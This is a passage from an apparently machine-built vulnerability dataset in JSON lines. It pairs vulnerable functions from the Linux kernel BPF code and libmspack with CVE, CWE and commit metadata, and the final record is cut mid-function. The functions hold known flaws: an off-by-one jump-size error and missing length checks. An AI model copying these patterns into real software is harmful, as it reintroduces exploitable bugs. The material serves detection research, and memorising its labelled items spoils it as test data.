*nla;\n\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n\tnla = nla_find((struct nlattr *) &skb->data[A], skb->len - A, X);\n\tif (nla)\n\t\treturn (void *) nla - (void *) skb->data;\n\n\treturn 0;\n}\n", "func_hash": 257641762135738592354784648632560996645, "file_name": "filter.c", "file_hash": 228552301451129948726370568954536416607, "cwe": ["CWE-189"], "cve": "CVE-2014-3144", "cve_desc": "The (1) BPF_S_ANC_NLATTR and (2) BPF_S_ANC_NLATTR_NEST extension implementations in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 do not check whether a certain length value is sufficiently large, which allows local users to cause a denial of service (integer underflow and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr and __skb_get_nlattr_nest functions before the vulnerability was announced.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3144"}
{"idx": 1306, "project": "linux", "commit_id": "a03ffcf873fe0f2565386ca8ef832144c42e67fa", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a03ffcf873fe0f2565386ca8ef832144c42e67fa", "commit_message": "net: bpf_jit: fix an off-one bug in x86_64 cond jump target\n\nx86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6\nbytes.\n\nIn case a conditional jump is followed by a long jump, conditional jump\ntarget is one byte past the start of target instruction.\n\nSigned-off-by: Markus Ktter <nepenthesdev@gmail.com>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "void bpf_jit_compile(struct sk_filter *fp)\n{\n\tu8 temp[64];\n\tu8 *prog;\n\tunsigned int proglen, oldproglen = 0;\n\tint ilen, i;\n\tint t_offset, f_offset;\n\tu8 t_op, f_op, seen = 0, pass;\n\tu8 *image = NULL;\n\tu8 *func;\n\tint pc_ret0 = -1; /* bpf index of first RET #0 instruction (if any) */\n\tunsigned int cleanup_addr; /* epilogue code offset */\n\tunsigned int *addrs;\n\tconst struct sock_filter *filter = fp->insns;\n\tint flen = fp->len;\n\n\tif (!bpf_jit_enable)\n\t\treturn;\n\n\taddrs = kmalloc(flen * sizeof(*addrs), GFP_KERNEL);\n\tif (addrs == NULL)\n\t\treturn;\n\n\t/* Before first pass, make a rough estimation of addrs[]\n\t * each bpf instruction is translated to less than 64 bytes\n\t */\n\tfor (proglen = 0, i = 0; i < flen; i++) {\n\t\tproglen += 64;\n\t\taddrs[i] = proglen;\n\t}\n\tcleanup_addr = proglen; /* epilogue address */\n\n\tfor (pass = 0; pass < 10; pass++) {\n\t\t/* no prologue/epilogue for trivial filters (RET something) */\n\t\tproglen = 0;\n\t\tprog = temp;\n\n\t\tif (seen) {\n\t\t\tEMIT4(0x55, 0x48, 0x89, 0xe5); /* push %rbp; mov %rsp,%rbp */\n\t\t\tEMIT4(0x48, 0x83, 0xec, 96);\t/* subq  $96,%rsp\t*/\n\t\t\t/* note : must save %rbx in case bpf_error is hit */\n\t\t\tif (seen & (SEEN_XREG | SEEN_DATAREF))\n\t\t\t\tEMIT4(0x48, 0x89, 0x5d, 0xf8); /* mov %rbx, -8(%rbp) */\n\t\t\tif (seen & SEEN_XREG)\n\t\t\t\tCLEAR_X(); /* make sure we dont leek kernel memory */\n\n\t\t\t/*\n\t\t\t * If this filter needs to access skb data,\n\t\t\t * loads r9 and r8 with :\n\t\t\t *  r9 = skb->len - skb->data_len\n\t\t\t *  r8 = skb->data\n\t\t\t */\n\t\t\tif (seen & SEEN_DATAREF) {\n\t\t\t\tif (offsetof(struct sk_buff, len) <= 127)\n\t\t\t\t\t/* mov    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x8b, 0x4f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\t/* mov    off32(%rdi),%r9d */\n\t\t\t\t\tEMIT3(0x44, 0x8b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data_len)))\n\t\t\t\t\t/* sub    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x2b, 0x4f, offsetof(struct sk_buff, data_len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT3(0x44, 0x2b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data_len), 4);\n\t\t\t\t}\n\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data)))\n\t\t\t\t\t/* mov off8(%rdi),%r8 */\n\t\t\t\t\tEMIT4(0x4c, 0x8b, 0x47, offsetof(struct sk_buff, data));\n\t\t\t\telse {\n\t\t\t\t\t/* mov off32(%rdi),%r8 */\n\t\t\t\t\tEMIT3(0x4c, 0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data), 4);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tswitch (filter[0].code) {\n\t\tcase BPF_S_RET_K:\n\t\tcase BPF_S_LD_W_LEN:\n\t\tcase BPF_S_ANC_PROTOCOL:\n\t\tcase BPF_S_ANC_IFINDEX:\n\t\tcase BPF_S_ANC_MARK:\n\t\tcase BPF_S_ANC_RXHASH:\n\t\tcase BPF_S_ANC_CPU:\n\t\tcase BPF_S_ANC_QUEUE:\n\t\tcase BPF_S_LD_W_ABS:\n\t\tcase BPF_S_LD_H_ABS:\n\t\tcase BPF_S_LD_B_ABS:\n\t\t\t/* first instruction sets A register (or is RET 'constant') */\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* make sure we dont leak kernel information to user */\n\t\t\tCLEAR_A(); /* A = 0 */\n\t\t}\n\n\t\tfor (i = 0; i < flen; i++) {\n\t\t\tunsigned int K = filter[i].k;\n\n\t\t\tswitch (filter[i].code) {\n\t\t\tcase BPF_S_ALU_ADD_X: /* A += X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x01, 0xd8);\t\t/* add %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_ADD_K: /* A += K; */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc0, K);\t/* add imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x05, K);\t/* add imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_X: /* A -= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x29, 0xd8);\t\t/* sub    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_K: /* A -= K */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xe8, K); /* sub imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x2d, K); /* sub imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_X: /* A *= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT3(0x0f, 0xaf, 0xc3);\t/* imul %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_K: /* A *= K */\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x6b, 0xc0, K); /* imul imm8,%eax,%eax */\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x69, 0xc0);\t\t/* imul imm32,%eax */\n\t\t\t\t\tEMIT(K, 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_X: /* A /= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x85, 0xdb);\t/* test %ebx,%ebx */\n\t\t\t\tif (pc_ret0 != -1)\n\t\t\t\t\tEMIT_COND_JMP(X86_JE, addrs[pc_ret0] - (addrs[i] - 4));\n\t\t\t\telse {\n\t\t\t\t\tEMIT_COND_JMP(X86_JNE, 2 + 5);\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT1_off32(0xe9, cleanup_addr - (addrs[i] - 4)); /* jmp .+off32 */\n\t\t\t\t}\n\t\t\t\tEMIT4(0x31, 0xd2, 0xf7, 0xf3); /* xor %edx,%edx; div %ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_K: /* A = reciprocal_divide(A, K); */\n\t\t\t\tEMIT3(0x48, 0x69, 0xc0); /* imul imm32,%rax,%rax */\n\t\t\t\tEMIT(K, 4);\n\t\t\t\tEMIT4(0x48, 0xc1, 0xe8, 0x20); /* shr $0x20,%rax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x21, 0xd8);\t\t/* and %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_K:\n\t\t\t\tif (K >= 0xFFFFFF00) {\n\t\t\t\t\tEMIT2(0x24, K & 0xFF); /* and imm8,%al */\n\t\t\t\t} else if (K >= 0xFFFF0000) {\n\t\t\t\t\tEMIT2(0x66, 0x25);\t/* and imm16,%ax */\n\t\t\t\t\tEMIT2(K, 2);\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0x25, K);\t/* and imm32,%eax */\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x09, 0xd8);\t\t/* or %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_K:\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc8, K); /* or imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x0d, K);\t/* or imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_X: /* A <<= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe0);\t/* mov %ebx,%ecx; shl %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_K:\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe0); /* shl %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe0, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_X: /* A >>= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe8);\t/* mov %ebx,%ecx; shr %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_K: /* A >>= K; */\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe8); /* shr %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe8, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_NEG:\n\t\t\t\tEMIT2(0xf7, 0xd8);\t\t/* neg %eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_RET_K:\n\t\t\t\tif (!K) {\n\t\t\t\t\tif (pc_ret0 == -1)\n\t\t\t\t\t\tpc_ret0 = i;\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0xb8, K);\t/* mov $imm32,%eax */\n\t\t\t\t}\n\t\t\t\t/* fallinto */\n\t\t\tcase BPF_S_RET_A:\n\t\t\t\tif (seen) {\n\t\t\t\t\tif (i != flen - 1) {\n\t\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (seen & SEEN_XREG)\n\t\t\t\t\t\tEMIT4(0x48, 0x8b, 0x5d, 0xf8);  /* mov  -8(%rbp),%rbx */\n\t\t\t\t\tEMIT1(0xc9);\t\t/* leaveq */\n\t\t\t\t}\n\t\t\t\tEMIT1(0xc3);\t\t/* ret */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TAX: /* X = A */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xc3);\t/* mov    %eax,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TXA: /* A = X */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xd8);\t/* mov    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_IMM: /* A = K */\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_A();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xb8, K); /* mov $imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_IMM: /* X = K */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_X();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xbb, K); /* mov $imm32,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_MEM: /* A = mem[K] : mov off8(%rbp),%eax */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_MEM: /* X = mem[K] : mov off8(%rbp),%ebx */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ST: /* mem[K] = A : mov %eax,off8(%rbp) */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_STX: /* mem[K] = X : mov %ebx,off8(%rbp) */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_LEN: /*\tA = skb->len; */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, len) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov    off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_W_LEN: /* X = skb->len; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov off8(%rdi),%ebx */\n\t\t\t\t\tEMIT3(0x8b, 0x5f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x9f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_PROTOCOL: /* A = ntohs(skb->protocol); */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, protocol) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, protocol))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, protocol));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, protocol), 4);\n\t\t\t\t}\n\t\t\t\tEMIT2(0x86, 0xc4); /* ntohs() : xchg   %al,%ah */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_IFINDEX:\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, dev))) {\n\t\t\t\t\t/* movq off8(%rdi),%rax */\n\t\t\t\t\tEMIT4(0x48, 0x8b, 0x47, offsetof(struct sk_buff, dev));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x48, 0x8b, 0x87); /* movq off32(%rdi),%rax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, dev), 4);\n\t\t\t\t}\n\t\t\t\tEMIT3(0x48, 0x85, 0xc0);\t/* test %rax,%rax */\n\t\t\t\tEMIT_COND_JMP(X86_JE, cleanup_addr - (addrs[i] - 6));\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct net_device, ifindex) != 4);\n\t\t\t\tEMIT2(0x8b, 0x80);\t/* mov off32(%rax),%eax */\n\t\t\t\tEMIT(offsetof(struct net_device, ifindex), 4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_MARK:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, mark) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, mark))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, mark));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, mark), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_RXHASH:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, rxhash) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, rxhash))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, rxhash));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, rxhash), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_QUEUE:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, queue_mapping) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, queue_mapping))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, queue_mapping));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, queue_mapping), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_CPU:\n#ifdef CONFIG_SMP\n\t\t\t\tEMIT4(0x65, 0x8b, 0x04, 0x25); /* mov %gs:off32,%eax */\n\t\t\t\tEMIT((u32)(unsigned long)&cpu_number, 4); /* A = smp_processor_id(); */\n#else\n\t\t\t\tCLEAR_A();\n#endif\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_ABS:\n\t\t\t\tfunc = sk_load_word;\ncommon_load:\t\t\tseen |= SEEN_DATAREF;\n\t\t\t\tif ((int)K < 0)\n\t\t\t\t\tgoto out;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K); /* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_ABS:\n\t\t\t\tfunc = sk_load_half;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LD_B_ABS:\n\t\t\t\tfunc = sk_load_byte;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LDX_B_MSH:\n\t\t\t\tif ((int)K < 0) {\n\t\t\t\t\tif (pc_ret0 != -1) {\n\t\t\t\t\t\tEMIT_JMP(addrs[pc_ret0] - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = sk_load_byte_msh - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call sk_load_byte_msh */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_IND:\n\t\t\t\tfunc = sk_load_word_ind;\ncommon_load_ind:\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi   */\n\t\t\t\tEMIT1_off32(0xe8, t_offset);\t/* call sk_load_xxx_ind */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_IND:\n\t\t\t\tfunc = sk_load_half_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_LD_B_IND:\n\t\t\t\tfunc = sk_load_byte_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_JMP_JA:\n\t\t\t\tt_offset = addrs[i + K] - addrs[i];\n\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\tbreak;\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_K, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_K, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_K, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_K,X86_JNE, X86_JE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_X, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_X, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_X, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_X,X86_JNE, X86_JE);\n\ncond_branch:\t\t\tf_offset = addrs[i + filter[i].jf] - addrs[i];\n\t\t\t\tt_offset = addrs[i + filter[i].jt] - addrs[i];\n\n\t\t\t\t/* same targets, can avoid doing the test :) */\n\t\t\t\tif (filter[i].jt == filter[i].jf) {\n\t\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tswitch (filter[i].code) {\n\t\t\t\tcase BPF_S_JMP_JGT_X:\n\t\t\t\tcase BPF_S_JMP_JGE_X:\n\t\t\t\tcase BPF_S_JMP_JEQ_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x39, 0xd8); /* cmp %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x85, 0xd8); /* test %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JEQ_K:\n\t\t\t\t\tif (K == 0) {\n\t\t\t\t\t\tEMIT2(0x85, 0xc0); /* test   %eax,%eax */\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase BPF_S_JMP_JGT_K:\n\t\t\t\tcase BPF_S_JMP_JGE_K:\n\t\t\t\t\tif (K <= 127)\n\t\t\t\t\t\tEMIT3(0x83, 0xf8, K); /* cmp imm8,%eax */\n\t\t\t\t\telse\n\t\t\t\t\t\tEMIT1_off32(0x3d, K); /* cmp imm32,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_K:\n\t\t\t\t\tif (K <= 0xFF)\n\t\t\t\t\t\tEMIT2(0xa8, K); /* test imm8,%al */\n\t\t\t\t\telse if (!(K & 0xFFFF00FF))\n\t\t\t\t\t\tEMIT3(0xf6, 0xc4, K >> 8); /* test imm8,%ah */\n\t\t\t\t\telse if (K <= 0xFFFF) {\n\t\t\t\t\t\tEMIT2(0x66, 0xa9); /* test imm16,%ax */\n\t\t\t\t\t\tEMIT(K, 2);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tEMIT1_off32(0xa9, K); /* test imm32,%eax */\n\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\t}\n \t\t\t\tif (filter[i].jt != 0) {\n\t\t\t\t\tif (filter[i].jf)\n\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 6;\n \t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n \t\t\t\t\tif (filter[i].jf)\n \t\t\t\t\t\tEMIT_JMP(f_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tEMIT_COND_JMP(f_op, f_offset);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t/* hmm, too complex filter, give up with jit compiler */\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tilen = prog - temp;\n\t\t\tif (image) {\n\t\t\t\tif (unlikely(proglen + ilen > oldproglen)) {\n\t\t\t\t\tpr_err(\"bpb_jit_compile fatal error\\n\");\n\t\t\t\t\tkfree(addrs);\n\t\t\t\t\tmodule_free(NULL, image);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tmemcpy(image + proglen, temp, ilen);\n\t\t\t}\n\t\t\tproglen += ilen;\n\t\t\taddrs[i] = proglen;\n\t\t\tprog = temp;\n\t\t}\n\t\t/* last bpf instruction is always a RET :\n\t\t * use it to give the cleanup instruction(s) addr\n\t\t */\n\t\tcleanup_addr = proglen - 1; /* ret */\n\t\tif (seen)\n\t\t\tcleanup_addr -= 1; /* leaveq */\n\t\tif (seen & SEEN_XREG)\n\t\t\tcleanup_addr -= 4; /* mov  -8(%rbp),%rbx */\n\n\t\tif (image) {\n\t\t\tWARN_ON(proglen != oldproglen);\n\t\t\tbreak;\n\t\t}\n\t\tif (proglen == oldproglen) {\n\t\t\timage = module_alloc(max_t(unsigned int,\n\t\t\t\t\t\t   proglen,\n\t\t\t\t\t\t   sizeof(struct work_struct)));\n\t\t\tif (!image)\n\t\t\t\tgoto out;\n\t\t}\n\t\toldproglen = proglen;\n\t}\n\tif (bpf_jit_enable > 1)\n\t\tpr_err(\"flen=%d proglen=%u pass=%d image=%p\\n\",\n\t\t       flen, proglen, pass, image);\n\n\tif (image) {\n\t\tif (bpf_jit_enable > 1)\n\t\t\tprint_hex_dump(KERN_ERR, \"JIT code: \", DUMP_PREFIX_ADDRESS,\n\t\t\t\t       16, 1, image, proglen, false);\n\n\t\tbpf_flush_icache(image, image + proglen);\n\n\t\tfp->bpf_func = (void *)image;\n\t}\nout:\n\tkfree(addrs);\n\treturn;\n}\n", "func_hash": 197306910127583663033501869105835713601, "file_name": "bpf_jit_comp.c", "file_hash": 118916419377068635213074563730085818945, "cwe": ["CWE-189"], "cve": "CVE-2014-2889", "cve_desc": "Off-by-one error in the bpf_jit_compile function in arch/x86/net/bpf_jit_comp.c in the Linux kernel before 3.1.8, when BPF JIT is enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges via a long jump after a conditional jump.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2889"}
{"idx": 1469, "project": "libmspack", "commit_id": "18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3", "project_url": "https://github.com/kyz/libmspack", "commit_url": "https://github.com/kyz/libmspack/commit/18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3", "commit_message": "Prevent a 1-byte underread of the input buffer if an odd-sized data block comes just before an uncompressed block header", "target": 1, "func": "int lzxd_decompress(struct lzxd_stream *lzx, off_t out_bytes) {\n  /* bitstream and huffman reading variables */\n  register unsigned int bit_buffer;\n  register int bits_left, i=0;\n  unsigned char *i_ptr, *i_end;\n  register unsigned short sym;\n\n  int match_length, length_footer, extra, verbatim_bits, bytes_todo;\n  int this_run, main_element, aligned_bits, j;\n  unsigned char *window, *runsrc, *rundest, buf[12];\n  unsigned int frame_size=0, end_frame, match_offset, window_posn;\n  unsigned int R0, R1, R2;\n\n  /* easy answers */\n  if (!lzx || (out_bytes < 0)) return MSPACK_ERR_ARGS;\n  if (lzx->error) return lzx->error;\n\n  /* flush out any stored-up bytes before we begin */\n  i = lzx->o_end - lzx->o_ptr;\n  if ((off_t) i > out_bytes) i = (int) out_bytes;\n  if (i) {\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n  }\n  if (out_bytes == 0) return MSPACK_ERR_OK;\n\n  /* restore local state */\n  RESTORE_BITS;\n  window = lzx->window;\n  window_posn = lzx->window_posn;\n  R0 = lzx->R0;\n  R1 = lzx->R1;\n  R2 = lzx->R2;\n\n  end_frame = (unsigned int)((lzx->offset + out_bytes) / LZX_FRAME_SIZE) + 1;\n\n  while (lzx->frame < end_frame) {\n    /* have we reached the reset interval? (if there is one?) */\n    if (lzx->reset_interval && ((lzx->frame % lzx->reset_interval) == 0)) {\n      if (lzx->block_remaining) {\n\tD((\"%d bytes remaining at reset interval\", lzx->block_remaining))\n\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n      }\n\n      /* re-read 